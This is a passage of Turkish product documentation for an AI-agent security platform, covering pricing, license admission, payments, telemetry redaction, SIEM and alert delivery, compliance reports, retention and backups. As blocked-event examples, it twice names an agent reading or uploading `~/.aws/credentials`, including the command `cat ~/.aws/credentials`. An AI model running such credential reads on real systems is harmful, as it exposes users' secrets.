(drift) testiyle birebir aynı tutulan statik bir aynayı gösterir.

**Neden önemli.** Satış ekibi, fiyat sayfası ve faturalama sayfası aynı rakamları söyler.

**Nasıl çalışır.** Bir katalog satırı hiçbir şey vermez; kapasite yalnızca aşağıdaki
denetlenen kabul yollarıyla değişir. Oturum açmış kullanıcılar etkin satırları okuyabilir;
satırları yalnızca migration'lar yazar.

**Plan x özellik matrisi** (liste fiyatları; USD, geliştirici koltuğu başına, vergiler
hariç; COM-001 onayına tabi; teklif veya sipariş geçerlidir):

| | Free | Team | Business | Enterprise |
| --- | --- | --- | --- | --- |
| Fiyat, aylık faturalama | $0 | $24 / geliştirici / ay | sunulmaz (yalnızca yıllık) | Özel |
| Fiyat, yıllık faturalama | $0 | $20 / geliştirici / ay (yılda $240) | $45 / geliştirici / ay (yılda $540) | Özel |
| Asgari | 1 ajan | 3 geliştirici | 25 geliştirici | Anlaşmaya göre |
| Koltuk başına ajan | 1 | 1 | 1 | 1 |
| Dağıtım | Bulut | Bulut | Bulut, On-prem | On-prem, Air-gapped |
| Liste olay saklama süresi | 7 gün | 90 gün | 365 gün | Sözleşmeye göre |
| Satın alma | Kayıt ol | Etkinse self-service kart, değilse fatura | Satış destekli, fatura | Satış destekli, fatura |
| Yerel tespit motoru (`local_detection`) | Evet | Evet | Evet | Evet |
| Kontrol düzlemi konsolu (`dashboard`): olaylar, olası olaylar, ajanlar, politikalar, DLP düzenleyicisi, API anahtarları, ekip, ayarlar, faturalama | Evet | Evet | Evet | Evet |
| Browser Privacy Guard (`browser_privacy_guard`) | - | Evet | Evet | Evet |
| Microsoft Entra ID SSO (`entra_sso`) | - | Evet | Evet | Evet |
| SIEM dışa aktarımı (`siem_export`) | - | - | Evet | Evet |
| SCIM senkronizasyonu (`scim`) | - | - | Evet | Evet |
| Yapay Zekâ Güvenlik Duruşu (`ai_security_posture`) | - | - | Evet | Evet |
| Air-gapped dağıtım (`air_gapped_deployment`) | - | - | - | Evet |
| Özel destek (`dedicated_support`) | - | - | - | Evet |

Yerel tespit her uç noktada, bir plan veya hesap **olsun ya da olmasın** çalışır.

**Nasıl kullanılır.** `/pricing` sayfasına bakın veya oturum açmış bir kullanıcı olarak
`public.plans` tablosunu sorgulayın. Sütunların açıklaması [pricing.md](../../../pricing.md)
dosyasındadır.

**Örnek.** Yıllık Business planındaki 40 geliştiricili bir şirket: liste fiyatıyla
40 × $540 = yılda $21.600; 40 korunan ajan kabul edilir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| - | Katalog bulut ve on-prem veritabanlarında bulunur | - |

**Sınırlamalar.** Bir katalog özelliği, desteklenen olarak satılmadan önce kendi sürüm
kabulünü geçmelidir. Yazılım bugün özellikleri plana göre kısıtlamaz. Liste saklama süresi
ticari bir koşuldur; geçerli saklama süresi çalışma alanı ayarıdır.

### Deneme ve tenant kabulü

**Ne yapar.** **Kabul** (admission), bir tenant'ın ajan kaydedip olay alıp alamayacağını
ve kaç ajanla bunu yapabileceğini belirler. Üç kaynaktan gelebilir: **doğrulanmış
deneme** (1 koltuk, tam 14 gün), **operatör lisansı** (onaylı fatura, sipariş veya imzalı
on-prem lisansından) veya **kart aboneliği** (yalnızca self-service derlemeler).

**Neden önemli.** "Birisi ödedi" veya "birisi kaydoldu" durumunu, "bu tenant platforma uç
nokta koyabilir" kararından ayırır ve her değişikliği denetlenen bir işlem yapar.

**Nasıl çalışır.** Dağıtımın bir operatör tarafından bir kez belirlenen tek bir kabul modu
vardır: `cloud`, `onprem` veya `pilot`. `start_verified_trial` için bulut modu, owner rolü,
güncel Kullanım Koşulları ve Gizlilik sürümlerinin kabulünün kaydı ve daha önce hiç
deneme kullanmamış bir kullanıcı gerekir. Auth meta verisindeki deneme işareti
değiştirilemez. Ingest ve kayıt `tenant_admission_capacity` değerini kontrol eder. Kabul
edilmiş kapasitesi olmayan bir tenant yeni ajanları reddeder.

**Nasıl kullanılır.** Bulut müşterileri denemeyi **Connect** sayfasından başlatır. Ücretli
koşullar aşağıdaki yollarla gelir. Faturalama sayfası kabul durumunu ve dönem sonunu
gösterir.

**Örnek.** Denemenin 15. gününde kabul sona erer. Yeni kayıtlar ve olay alımı reddedilir;
faturalama sayfası "This tenant has no admitted protected-agent capacity." der. Uç
noktalar yerel korumayı sürdürür.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Deneme: bulut kaydı; lisanslar: tüm ücretli planlar | Deneme: Bulut. Lisanslar: Bulut, On-prem, Air-gapped | - |

**Sınırlamalar.** İptal, bağlantısı kopuk bir uç noktaya ancak yeniden bağlandığında
ulaşır. Ücretli koltuklar tek başına bir tenant'ı kabul ettirmez.

### Ödeme yolları: fatura ve kart

**Ne yapar.** İki kanal vardır. **Fatura** (varsayılan) kurumsal ve on-prem siparişler
içindir. Stripe üzerinden **kart aboneliği** bulut Team ve Business planları içindir ve
yalnızca bunu açıkça etkinleştiren derlemelerde çalışır.

**Neden önemli.** Bir tarayıcı isteği veya doğrulanmamış bir webhook asla ücretli kapasite
oluşturmamalıdır.

**Nasıl çalışır.**
- *Fatura:* `invoice-entitlement`, oturum ve MFA kontrollerinden sonra tekrarlanabilir
  (idempotent), tenant'a bağlı bir talebi `enterprise_invoice_orders` tablosuna
  `pending_finance` olarak kaydeder. Denetlenen bir Finans onayı ödeme kararını kaydeder.
  Ardından bir kabul operatörü `grant_licensed_tenant_admission` ile süreli bir lisans
  tanımlar.
- *Kart:* Yalnızca sunucuda `AIDR_ENABLE_LEGACY_SELF_SERVICE_BILLING=true`,
  `AIDR_BILLING_PROVIDER=stripe` ve `AIDR_STRIPE_PRICE_MAP` ayarlıysa ve konsol
  `VITE_AIDR_COMMERCIAL_MODE=self-service` ile derlenmişse etkindir. `stripe-webhook`
  fonksiyonu imzalı bir aboneliği bir plana eşler ve `apply_stripe_plan_subscription`
  çağırır. Bu fonksiyon lisansı yalnızca plan asgarisini karşılayan, etkin ve otomatik
  tahsil edilen bir abonelik için, `stripe:<abonelik kimliği>` referansına bağlı olarak
  tanımlar. Lisans ödenen dönemin sonunda biter. Fonksiyon bir operatör lisansını veya
  iptalini asla geçersiz kılmaz; `trialing`, `past_due` ve benzeri durumları bekletir ve
  her karar için bir `admin_audit_logs` satırı yazar.

**Nasıl kullanılır.** Varsayılan derlemeler satış iletişim ayarları (`VITE_SALES_URL` veya
`VITE_SALES_EMAIL`) dışında kurulum gerektirmez. Kart ödemesi, Finans onayı gerektiren bir
operatör kararıdır.

**Örnek.** Durumu `past_due` olan bir Stripe `customer.subscription.updated` olayı
durumu kaydeder ve hiçbir şey vermez (`billing.stripe_plan_status_recorded`).

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Fatura: tüm ücretli planlar. Kart: Team, Business (`self_serve` yalnızca Free ve Team için true) | Fatura: Bulut ve On-prem. Kart: yalnızca Bulut | - |

**Sınırlamalar.** Kart yolunun yerel imza ve tekrar oynatma (replay) testleri vardır; ancak
kabul edilmiş canlı bir sağlayıcı hesabı, fiyat, portal, iade veya mutabakat yoktur.
Paddle yardımcıları eski koddur ve kapalı kalır.

### Operatör yönetimi (operator-admin)

**Ne yapar.** Platform operatörleri, yani tenant sahipleri değil, bir kontrol düzlemini
işleten kişiler, `operator-admin` fonksiyonunu veya CLI'ı `scripts/operator-admin.mjs`'i
kullanır. Bu araçla kabul modunu sabitler, onaylı Kullanım Koşulları ve Gizlilik
belgelerini (URL ve SHA-256) kaydeder, lisans tanımlar ve iptal eder, tenant'ları listeler
ve tenant bazında kullanımı okurlar.

**Neden önemli.** Lisans tanımlamak hem mali hem güvenlik açısından önemlidir. Bu işlem
service-role anahtarını tutan bir betik tarafından değil, adı belli ve MFA ile doğrulanmış
kişiler tarafından, makbuz bırakılarak yapılmalıdır.

**Nasıl çalışır.** Bir istek ancak tüm kontroller geçerse başarılı olur: geçerli bir erişim
belirteci, kimlik bariyeri, `public.platform_operators` tablosunda etkin ve süresi dolmamış
bir satır (varsayılan 30 gün), AAL2 ve 16 KiB ile sınırlı bir gövde. SQL işlemi içinde
operatör satırı yeniden kontrol edilir, mevcut RPC çağrılır ve işlemi yapanı belirten bir
`admin_audit_logs` makbuzu yazılır. Herhangi bir adım başarısız olursa tüm değişiklik
geri alınır. Lisans tanımlama ayrıca o tenant için süresi dolmamış bir
`admission_operators` satırı ister; bu satırın sahibi tenant'ın üyesi olamaz (görevler
ayrılığı).

**Nasıl kullanılır.** CLI kimlik bilgilerini yalnızca ortam değişkenlerinden okur
(`AIDR_SUPABASE_URL`, `SUPABASE_ANON_KEY` ve ya `AIDR_OPERATOR_ACCESS_TOKEN` ya da
`AIDR_OPERATOR_EMAIL` + `AIDR_OPERATOR_PASSWORD` + `AIDR_OPERATOR_TOTP_CODE`):
```bash
node scripts/operator-admin.mjs mode onprem
node scripts/operator-admin.mjs grant --tenant <tenant-uuid> --plan business --seats 30 \
  --expires-at 2027-09-30T23:59:59Z --reference PO-2026-001
node scripts/operator-admin.mjs usage --tenant <tenant-uuid>
node scripts/operator-admin.mjs revoke --tenant <tenant-uuid> --reason "sözleşme sona erdi"
```
İsteği göndermeden yazdırmak için `--dry-run` ekleyin.

**Örnek.** TOTP ile yükseltilmemiş bir oturumdaki operatör `grant` çalıştırır. CLI `1` ile
çıkar ve `403 mfa_required` yazdırır. Doğrulamadan sonra işlem başarılı olur ve
`operator.license_granted` kaydı yazılır.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Operatör aracı, plan özelliği değil | Bulut (SingularityRD operatörleri), On-prem ve Air-gapped (müşteri operatörleri) | Operatör iş istasyonunda Node |

**Sınırlamalar.** Tarayıcı kodu bu fonksiyonu hiç çağırmaz; hiçbir ajan veya MCP aracı ona
ulaşamaz. Operatör satırları yalnızca veritabanı yöneticisi değişiklik süreciyle eklenir.

---

## 7. Telemetri ve telemetrinin gizliliği

### Maskelenmiş, yalnızca sayım içeren telemetri

**Ne yapar.** Kayıtlı uç noktalar kontrol düzlemine **en aza indirilmiş** olaylar gönderir:
ajan kararları, olaylar, eklenti ve posture bulguları, politika önbellek makbuzları ve
Browser Guard `privacy_scan` sayımları.

**Neden önemli.** Bir güvenlik ürünü veri sızıntısı kanalına dönüşmemelidir. Müşteriler
sunucuya tam olarak neyin ulaştığını bilmek ister.

**Nasıl çalışır.**
- Ajan karar olayları uç noktada zorunlu bir kimlik bilgisi maskeleme sınırından geçer.
  Varsayılan `control_plane.redact_mode: "hash"` araç özetlerini ve artefaktları SHA-256
  özetleriyle değiştirir; `"full"` bunları tamamen çıkarır. `"none"` yalnızca hata
  ayıklama içindir ve yine de bearer belirteçlerini, API anahtarlarını, JWT'leri ve URL
  kimlik bilgilerini temizler.
- Browser Guard yalnızca site, eylem, kanal ve tür bazında sayımları gönderir; metin,
  maskelenmiş metin, eşleşen değer veya sayfa adresi göndermez.
- Posture yüklemeleri yalnızca kimlikler, önem dereceleri, sürümler ve özetler taşır.
- Sunucu `supabase/functions/ingest` içinde sabit bir olay türü izin listesi uygular ve
  bilinmeyen alanları atar.
- Gönderilmeyenler: kaynak kod, dosya içerikleri ve istemler (prompt). İsteğe bağlı itibar
  sorguları, sürüm kontrolleri ve tanılama ayrı, açıkça etkinleştirilen akışlardır.
- On-prem'de telemetri SingularityRD'ye değil, sizin kontrol düzleminize gider.

**Nasıl kullanılır.** Uç nokta yapılandırmasında `redact_mode` değerini seçin. `allow`
hacmine ihtiyacınız yoksa `send_clean_verdicts: false` bırakın. Tüm dış akışlar için
[privacy.md](../../../privacy.md) dosyasına bakın.

**Örnek.** Bir ajan `cat ~/.aws/credentials` komutunu engeller. Olay `Bash` aracını,
`deny` kararını ve yol yerine bir özeti gösterir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped (Yerel modda telemetri yoktur) | Kayıtlı bağlayıcılar ve Browser Guard |

**Sınırlamalar.** Bu bir mühendislik veri akışı açıklamasıdır; veri işleme sözleşmesi
(DPA) değildir. Her müşteri hedefleri, bölgeyi, saklama süresini ve alt işlemcileri
kaydetmelidir. Tasarım, KVKK/GDPR yükümlülüklerini desteklemeye yöneliktir; bir sertifika
değildir.

---

## 8. Denetim dışa aktarımı ve SIEM teslimatı

### Denetim dışa aktarımı (CSV ve JSON)

**Ne yapar.** Tenant üyeleri tenant denetim günlüğünü **Team → Team audit** üzerinden CSV
veya JSON olarak dışa aktarır ya da `audit-export` API'siyle sayfa sayfa okur.

**Neden önemli.** Denetçilerin ve olay müdahale ekiplerinin, konsolda kimin ne yaptığının
eksiksiz ve kurcalamaya karşı iz bırakan bir kopyasına ihtiyacı vardır.

**Nasıl çalışır.** Her sayfa en fazla 500 satır içerir, özel `aidr-audit-exports`
kovasına (bucket) yazılır ve SHA-256 değeri ile imzalı bir `next_cursor` eşliğinde 60
saniye geçerli, imzalı bir indirme bağlantısı olarak verilir. `complete` değeri `true`
olana kadar imleci izleyin. Her sayfa tek bir anlık görüntüye bağlıdır. Etkin bir **yasal
saklama** (legal hold) dışa aktarımı engeller (`409 legal_hold_active`); saklama satırı
okunamazsa işlem reddedilir.

**Nasıl kullanılır.** **Team** sayfasında **Prepare CSV export** veya **Prepare JSON
export**, ardından **Save audit export** düğmesine basın.

**Örnek.** 1.320 kayıtlık bir dışa aktarım üç sayfa halinde gelir. Konsol her sayfanın
özetini ve anlık görüntüsünü kontrol edip bunları tek dosyada birleştirir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (konsol) | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Dışa aktarım yalnızca denetim günlüğünü kapsar; gizlilik taramaları ve
karar olayları buna dahil değildir. Depolama nesnelerinin temizlenmesi ayrıca yapılması
gereken bir işletim adımıdır.

### SIEM teslimatı

**Ne yapar.** Bir teslimat çalışanı, AIDR olay kayıtlarını taşınabilir `aidr.siem.event/v1`
şemasıyla **Splunk HEC**, **Microsoft Sentinel** (DCR tabanlı alım), **Elastic** veya
**genel bir webhook** hedefine iletir.

**Neden önemli.** SOC ekibi SIEM'inde çalışır. AIDR engellemeleri ve onay talepleri EDR ve
kimlik alarmlarının yanında yer almalıdır.

**Nasıl çalışır.** Çalışan kalıcı kuyrukları **en az bir kez** (at-least-once) teslimatla
boşaltır. Her olayın sabit bir `event_id` değeri vardır; desteklenen yerlerde idempotency
başlıkları gönderilir (Elastic belge kimliğine göre yinelenenleri ayıklar). "Delivered",
sağlayıcının makbuz sözleşmesinin karşılandığı anlamına gelir: Splunk başarı yanıtı,
Sentinel HTTP 204, kabul edilmiş bir Elastic öğesi veya `x-aidr-event-id` değerini geri
yansıtan bir webhook yanıtı. Kapasite dolduğunda yeni kayıtlar sessizce düşürülmez,
reddedilir. Self-hosted Compose'da `aidr-siem-delivery.timer` her dakika çalışır.

**Nasıl kullanılır.** Korumalı bir SIEM yapılandırması yazın
(`SINGULARITY_AIDR_SIEM_CONFIG_PATH`; durum dosyası `/var/lib/aidr-siem` altında), ardından
`sudo sh /srv/aidr/maintenance/install-systemd.sh` çalıştırın. Bir anahtar, kuyruk veya
yapılandırma eksikse kurulum etkinleştirmeyi reddeder. Ayrıntılar için
[deploy/maintenance](../../../../deploy/maintenance/README.md) dosyasına bakın.

**Örnek.** Bir uç noktadaki `deny` kararı aynı `event_id` ile bir Sentinel kaydına
dönüşür. Bir çökmeden sonraki yeniden deneme yinelenen bir kayıt üretir; SOC kuralı bunu
`event_id` üzerinden ayıklar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business, Enterprise (`siem_export`) | On-prem Compose (systemd zamanlayıcı), Air-gapped (iç SIEM), Bulut (barındırılan hizmette listelenmiş); Helm için henüz CronJob yok | systemd'li Linux ana makine |

**Sınırlamalar.** Tam olarak bir kez (exactly-once) teslimat değildir. Webhook'lar kimlik
doğrulamayı zorunlu tutmaz; kimlik doğrulamasız bir webhook'u internetten erişilebilen bir
alıcıya yönlendirmeyin. mTLS veya istek imzalama yoktur. "Delivered" durumu, alıcı tarafta
indekslendiğini veya alarm üretildiğini kanıtlamaz.

### Uyum kanıt raporu

**Ne yapar.** Sahipler (owner) ve yöneticiler (admin), seçtikleri bir dönem (en fazla 366
gün) için tenant kapsamlı bir JSON raporunu **Compliance** (`/compliance`) sayfasından
veya `compliance-report` API'sinden üretir. Rapor, güvenlik ve KVKK/DPO ekiplerinden
genellikle istenen kanıtları bir araya getirir: tenant profili ve saklama ayarları,
çalışma ortamına göre koruma kapsamı, Browser Guard'ın veri türü, AI sitesi ve güne göre
maskelediği/uyardığı/engellediği sayılar, ajan DLP kararları, politika sürümleri ve
özetleri, sahip/yönetici listesiyle birlikte MFA/SSO/SCIM durumu, olaylar, AI güvenlik
duruşu (CVE önem dereceleri, MCP riskleri), veri akışı ve alt işleyen envanteri ile
saklama, yasal saklama, offboarding ve dışa aktarım temizliği kanıtları.

**Neden önemli.** KVKK ve GDPR kapsamındaki hesap verebilirlik çalışmaları her dönem aynı
olguları ister. Rapor bu çalışmayı doğrulanabilir tek bir belgeyle desteklemek üzere
tasarlanmıştır. Bir sertifika değildir ve kimsenin mevzuata uyumlu olduğunu beyan etmez.

**Nasıl çalışır.** Yalnızca service role'ün çalıştırabildiği bir SQL fonksiyonu sayıları,
sabit değer kümelerini, tanımlayıcıları, zaman damgalarını ve SHA-256 özetlerini toplar;
Edge Function sonucu bildirimsel bir şemadan geçirir, şemada olmayan her alanı atar ve
bozuk kanıtı reddeder. Rapor kanonik JSON'unun SHA-256 değerini ve kurulumda bir uyum
imzalama anahtarı varsa Ed25519 imzasını taşır. Üretilen her rapor, döndürülmeden önce
yönetici denetim günlüğüne (`compliance_report.generated`) yazılır. Üretim AAL2 oturumu
gerektirir, kimlik bariyerinden geçer, hız sınırına tabidir (kullanıcı başına dakikada 3)
ve her adımda hata durumunda reddeder (fail-closed).

**Nasıl kullanılır.** **Compliance** sayfasını açın, bir dönem seçin ve **Generate report**
düğmesine basın. Ardından JSON'u (yetkili belge), her bölüm tablosu için bir CSV içeren
ZIP paketini veya Türkçe ya da İngilizce yazdırılabilir raporu (**Print / save as PDF**)
indirin. Denetçiler JSON'u çevrimdışı doğrular:

```bash
aidr compliance verify rapor.json --public-key yayinci.pem --require-signature
```

**Örnek.** Bir veri koruma sorumlusu son 90 günün raporunu üretir, PDF'i üç aylık erişim
gözden geçirmesine ekler ve denetçiye JSON'u ve işletmecinin açık anahtarını verir.
Denetçinin `aidr compliance verify` komutu `VERIFIED` yazar; tek bir sayının
değiştirilmesi komutun 2 koduyla çıkmasına yol açar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (konsol) | Bulut, On-prem, Air-gapped (on-prem'de imzalama anahtarı elle ayarlanır) | Web konsolu; doğrulama için Linux, macOS ve Windows'ta `aidr` CLI |

**Sınırlamalar.** Sayılar yalnızca kontrol düzlemine ulaşmış ve hâlâ saklama süresi içinde
olan telemetriyi kapsar. Politika gövdeleri, istem metinleri ve yasal saklama gerekçeleri
bilinçli olarak dışarıda bırakılır. Veri akışı matrisi, açık `unknown` değerleri olan
ürün mühendislik envanteridir. CSV ve yazdırılabilir sürümler türetilmiştir ve imzasızdır.
İmzalama anahtarı yoksa rapor yalnızca özetle mühürlenir. Her bölümün neyi kanıtlayıp neyi
kanıtlamadığı için [docs/compliance-report.md](../../../compliance-report.md) belgesine
bakın.

### Alarm entegrasyonları: Slack, Teams, imzalı webhook ve e-posta

**Ne yapar.** **Ayarlar → Bildirimler** (Settings → Notifications) altında çalışma alanı
sahipleri ve yöneticileri gerçek zamanlı alarmları **Slack**'e (incoming webhook, Block Kit
mesajı), **Microsoft Teams**'e (workflow webhook, Adaptive Card), **imzalı bir HTTPS
webhook**'a (JSON şeması `aidr.notification.v1`) veya **e-posta** ile (1–10 alıcı)
gönderir. Her kanal kendi olaylarını seçer: en az belirli bir önem derecesindeki yeni
olaylar (incident), kritik çalışma zamanı engellemeleri (deny), bant dışı onay bekleyen
eylemler ve Browser Guard'ın engellediği istemlerdeki ani artışlar (örneğin 15 dakikada
10 engellenen gönderim).

**Neden önemli.** Engellenen bir veri sızdırma girişimi veya bir onay talebi ancak zamanında
görülürse işe yarar. SIEM'i olmayan ya da gece kimsenin izlemediği bir SIEM kullanan ekipler
de alarmı zaten çalıştıkları yerde alır.

**Nasıl çalışır.** Olay ve alarmı **aynı veritabanı işleminde** (transaction) yazılır:
telemetri tablosundaki bir `AFTER INSERT` tetikleyicisi, eşleşen her kanal için bir teslimat
kaydını kuyruğa alır (transactional outbox); böylece alarm yalnızca olay saklandıysa oluşur.
Her dakika çalışan bir dağıtıcı (dispatcher) zamanı gelen teslimatları kiralar ve 10 sn
zaman aşımı, **üstel geri çekilme** (30 sn'den 1 saate kadar 8 deneme) ve sabit bir
**idempotency anahtarı** (teslimat kimliği) ile gönderir. Genel webhook'lar
`X-AIDR-Signature: t=<ts>,v1=<HMAC-SHA256>` başlığıyla imzalanır; Node.js ve Python doğrulama
örnekleri [bildirim sözleşmesinde](../../../contracts/notifications.md) yer alır. Alarmlar
yalnızca **kimlikler, önem derecesi, kategori ve sayılar** ile konsola bir derin bağlantı
taşır; istem, komut, dosya yolu veya eşleşen değer asla içermez. Hedefler **yalnızca
yazılabilir**dir: bekleyen veride şifrelenir (AES-256-GCM, tenant ve kanala bağlı) ve bir
daha gösterilmez; konsol yalnızca ana makine adını ve kısa bir özeti gösterir. Her
gönderimden önce webhook ana makinesi çözümlenir; özel, link-local veya bulut metadata
adresleri reddedilir (**SSRF koruması**). Slack ve Teams URL'leri sağlayıcının webhook
ana makinelerinde olmalıdır ve yönlendirmeler asla izlenmez. Her değişiklik ve test
gönderimi MFA (AAL2) gerektirir, hız sınırına tabidir ve denetim kaydına yazılır.

**Nasıl kullanılır.** Ayarlar → Bildirimler → **Add a channel**: türü seçin, webhook
URL'sini yapıştırın (imzalı webhook için **Generate** ile gizli anahtar üretip alıcınıza
kopyalayın), olayları seçin ve kaydedin. **Send test** alıcının gerçek yanıtını gösterir;
daha sonra **Disable**, **Edit events** veya **Delete** kullanılabilir. **Recent
deliveries** her denemeyi durum ve hata koduyla listeler. Operatör dağıtıcıyı bir kez
zamanlar: Supabase Cloud'da pg_cron, Compose'da `install-systemd.sh --with-notifications`,
Helm'de `notifications.dispatcher.enabled=true` (bkz.
[kontrol düzlemi](../../../control-plane.md#alert-integrations-slack-teams-webhooks-e-mail)).

**Örnek.** Bir Claude Code ajanı `~/.aws/credentials` dosyasını yüklemeye çalışır; bağlayıcı
kritik bir kuralla engeller. Bir dakika içinde SOC Slack kanalında kural kimliği, ajan
kimliği ve **Open in AIDR** düğmesiyle "Critical agent action blocked" görünür; nöbetçi
webhook aynı alarmı alır, imzayı doğrular ve teslimat kimliğine göre bir kayıt açar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (panel) | Bulut (pg_cron + pg_net), On-prem Compose (systemd zamanlayıcı), Kubernetes (CronJob), Air-gapped (yalnızca iç webhook veya posta aktarıcısı) | Web konsolu; alıcılar functions çalışma ortamından erişilebilir olmalıdır |

**Sınırlamalar.** Teslimat tam olarak bir kez değil, en az bir kezdir; alıcılar teslimat
kimliğine göre yinelenenleri ayıklamalıdır. Gecikme dağıtıcı zamanlamasına bağlı olarak en
fazla yaklaşık bir dakikadır; konsoldaki test gönderimi anında yapılır. Her kanal dakikada
en fazla 30 kuyruğa alınmış alarmla sınırlıdır. `agent.offline` alarmı, özet/toplu
gönderim, kullanıcı bazlı tercih ve webhook alıcılarına mTLS yoktur. E-posta için bir posta
sağlayıcısı yapılandırılmış olmalıdır. DNS denetimi ile bağlantı ayrı ayrı çözümlenir;
on-prem'de bir çıkış (egress) izin listesi veya proxy ile birlikte kullanın. Hedefler
yalnızca yazılabilir olduğundan şifreleme anahtarını döndürmek hedeflerin yeniden
girilmesini gerektirir.

---

## 9. Saklama, yasal saklama ve offboarding

### Veri sınıfları, yasal saklama ve tenant offboarding

**Ne yapar.** Veriler **veri sınıfı** bazında saklanır: geçici dışa aktarımlar, erişim
kimlik bilgileri, telemetri, uç nokta kimliği, güvenlik istihbaratı, politika
yapılandırması, kimlik üyeliği, ticari kayıtlar, güvenlik denetimi ve işletim verileri. Her
sınıfın kendi saklama süresi vardır. **Yasal saklama** (legal hold) silmeyi ve dışa
aktarımı dondurur. **Offboarding**, bir tenant'ı makbuzlu aşamalarla kaldırır.

**Neden önemli.** Müşteriler verilerinin ne zaman silindiğini kanıtlayabilmelidir. Bir
dava süreci de bu silmeyi durdurabilmelidir.

**Nasıl çalışır.** `tenant_data_retention_policies`, her yeni tenant için sınıfları
tanımlar. Telemetri çalışma alanı saklama ayarını izler (1-3.650 gün, varsayılan 30).
`prune_expired_telemetry_events`, süresi dolan telemetriyi yasal saklama ve offboarding
ile aynı tenant kilidi altında siler. Offboarding kimlik bilgilerini ve kabulleri hemen
iptal eder, tenant'ı `closing` durumuna alır ve her sınıfı saklama süresi dolunca siler.
Bir silinme kaydı (tombstone) ve aşama makbuzlarını tutar. Posture satırları kaynak
olaylarıyla birlikte zincirleme silinir; satır kaldığı sürece bir kalıntı koruması
offboarding'in tamamlanmasını engeller.

**Nasıl kullanılır.** Owner çalışma alanını **Settings** üzerinden kapatır. Self-hosted
dağıtım operatörleri offboarding'i önce deneme çalıştırmasıyla yürütebilir:
```sh
node scripts/deployment-offboarding.mjs /srv/aidr --tenant <tenant-uuid>
node scripts/deployment-offboarding.mjs /srv/aidr --tenant <tenant-uuid> --apply --requested-by <operatör-kullanıcı-uuid>
```

**Örnek.** Telemetri saklama süresi 30 gün olan bir çalışma alanı 1 Ekim'de kapatılır. API
anahtarları hemen çalışmaz hale gelir. Telemetri süresi dolunca silinir. Yasal saklama
sırasında yapılan bir dışa aktarım denemesi `409 legal_hold_active` döndürür.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | - |

**Sınırlamalar.** Yedek kopyalar ayrı yedek saklama ve anahtar imha sürecine tabidir;
offboarding bunları asla silinmiş olarak raporlamaz. Uzak (offsite) yedek budama komutu
tenant yasal saklama kararlarına bakmaz; etkin bir yasal saklama varken budama yapmayın.

---

## 10. Yedekleme ve geri yükleme tatbikatları

### Şifreli uzak yedek ve zamanlanmış geri yükleme tatbikatı

**Ne yapar.** Compose kurulumlarında `deployment-backup.mjs` veritabanı ve depolamanın
soğuk, şifreli ve doğrulanmış bir yedeğini alır. `deployment-backup-offsite.mjs` bunu ayrı
bir dosya sistemine veya S3 uyumlu bir hedefe kopyalayıp doğrular.
`deployment-restore-drill.mjs` en yeni sağlam yedeği yalıtılmış bir projeye geri yükler ve
RPO/RTO sonuçlarını kaydeder.

**Neden önemli.** Hiç geri yüklenmemiş bir yedek bir denetim değil, bir umuttur. Tatbikat
kurtarmayı kanıta dönüştürür.

**Nasıl çalışır.** Yükleme rastgele bir hazırlık önekine yapılır, boyut ve SHA-256 ile
kontrol edilir, değişmez bir kimliğe kopyalanır ve bağımsız özet kontrolü için yeniden
indirilir. `COMMITTED.json` en son kopyalanır; böylece yarıda kalan bir aktarım asla
tamamlanmış sayılmaz. İsteğe bağlı S3 Object Lock (`GOVERNANCE` veya `COMPLIANCE`)
nesneleri WORM yapar. Uzak hedef kurtarma anahtarını asla almaz; yalnızca kasa (vault) veya
HSM adresi gibi bir `--key-reference` kaydedilir. Haftalık tatbikat zamanlayıcısı imzalı
sürüm adayını doğrular, yalnızca sahibin erişebildiği geçici dizinlere geri yükler ve
sonrasında kurtarılan tüm materyali siler.

**Nasıl kullanılır.**
```sh
node scripts/deployment-backup-offsite.mjs upload --backup /var/lib/aidr-backup/2026-09-12 \
  --target s3://company-backups/aidr/production --s3-region eu-central-1 \
  --key-file /run/credentials/aidr-recovery.key --key-reference hsm://security/aidr-recovery \
  --retention-days 35 --object-lock-mode COMPLIANCE --health-file /srv/aidr/health/backup.json
systemctl start aidr-restore-drill.service
```
Kubernetes kurulumları chart'ın `backup.enabled` ile açılan `pg_dump` CronJob'unu veya
veritabanı sağlayıcısının zamanda geri dönüş (PITR) özelliğini kullanır.

**Örnek.** Tatbikat dün geceki yedeği yeni bir projeye geri yükler ve hedef RPO 24 saat,
RTO 4 saat ile ölçülen değerleri içeren `restore-drill-evidence.json` dosyasını yazar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Self-hosted planlar (Business, Enterprise) | On-prem Compose, Air-gapped (çevrimdışı hedef); Helm: yalnızca `pg_dump` CronJob; Bulut: sağlayıcı işletir | systemd'li Linux ana makine; S3 hedefleri için AWS CLI v2 |

**Sınırlamalar.** Derin tarama durumu birimleri (volume) yedeğe dahil değildir. Gerçek uzak
hedef erişimi, bağımsız anahtar saklama, alarm teslimi ve ikinci bir arıza bölgesindeki
ana makinede geri yükleme her müşteri ortamında ayrıca kanıtlanmalıdır.

---

## 11. Sistem gözlemi ve alarmlar

### Hazırlık sondaları, metrikler ve Prometheus alarmları

**Ne yapar.** Konsol sunucusu `GET /livez` (süreç yanıt veriyor), `GET /readyz` (tüm üretim
bağımlılıkları hazır) ve `GET /metrics` (taşıyıcı belirteç arkasında Prometheus hazırlık
göstergeleri ve istek sayaçları) uç noktalarını sunar. `deploy/monitoring` 17 Prometheus
alarm kuralıyla gelir.

**Neden önemli.** Yeşil bir konteyner, çalışan bir güvenlik hizmeti demek değildir.
